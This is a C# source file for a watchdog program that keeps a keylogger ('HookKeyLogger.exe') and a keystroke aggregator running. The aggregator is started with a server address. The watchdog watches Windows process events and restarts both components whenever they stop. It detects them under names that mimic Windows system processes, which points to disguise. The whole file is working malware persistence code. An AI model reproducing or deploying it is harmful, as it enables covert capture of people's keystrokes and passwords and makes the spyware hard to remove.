﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Diagnostics;

namespace ApplicationWatcher
{
    public class ApplicationWatcherAsync
    {
       
        private static string locationExeHook = "HookKeyLogger.exe";
        private static string locationExeAgg = "KeypressAggregator.exe";
        private static string serverAddr = "localhost";

        ///<summary>
        ///Monitor the WMI to see when processes start and stop. Restart HookKeylogger and KeypressAggregator if terminated.
        ///</summary>
        public static void Main(string[] args)
        {
            if (args.Length < 3)
                throw new Exception("Needs two arguments for the locations of the KeyPress Aggregator and HookKeylogger EXE files.\n"+
                    "The third argument is the server address.");
            locationExeAgg = args[0];
            locationExeHook = args[1];
            serverAddr = args[2];
            

            startAll();
            ManagementEventWatcher startWatch = new ManagementEventWatcher(
              new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
            startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
            startWatch.Start();
            ManagementEventWatcher stopWatch = new ManagementEventWatcher(
              new WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace"));
            stopWatch.EventArrived += new EventArrivedEventHandler(stopWatch_EventArrived);
            stopWatch.Start();
            //Console.WriteLine("Press any key to exit");
            //while (!Console.KeyAvailable) System.Threading.Thread.Sleep(50);
            while (true) System.Threading.Thread.Sleep(50);
            //startWatch.Stop();
            //stopWatch.Stop();
        }
        ///<summary>
        ///Check that the process is active.
        ///</summary>
        private static bool isActive(string name)
        {
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains(name))
                {
                    return true;
                }
            }
            return false;
        }

        private static void startAll()
        {
            int[] active = new int[4] { 0, 0, 0, 0 };
            foreach (Process clsProcess in Process.GetProcesses())
            {
                string name = clsProcess.ProcessName;
                if (name == "Host Process for Windows Tasks")
                {
                    active[0] = 1;
                }
                else if (name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
                {
                    active[1] = 1;
                }
            }

            if (active[0] == 0)
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeAgg, serverAddr);
            }
            if (active[1] == 0)
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeHook);
            }

        }

        ///<summary>
        ///See that a process has stopped.
        ///</summary>
        static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
            //Console.WriteLine("Process stopped: {0}", name);
            if (name.Contains("Host"))
            {
                System.Threading.Thread.Sleep(10000);
                startAll();
            }
            else if (name.Contains("Windows"))
            {
                System.Threading.Thread.Sleep(10000);
                startAll();
            }

        }

        ///<summary>
        ///See that a process has started.
        ///</summary>
        private static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            //Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value);
            string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
            //Console.WriteLine("Process started: {0}", name);
            //if (name == "Chrome.exe")
            //{
            //    Console.WriteLine("Found");
            //    if (!isActive("Windows Printer Discovery Service"))
            //        System.Diagnostics.Process.Start(locationExe);
            //}
        }
    }
}
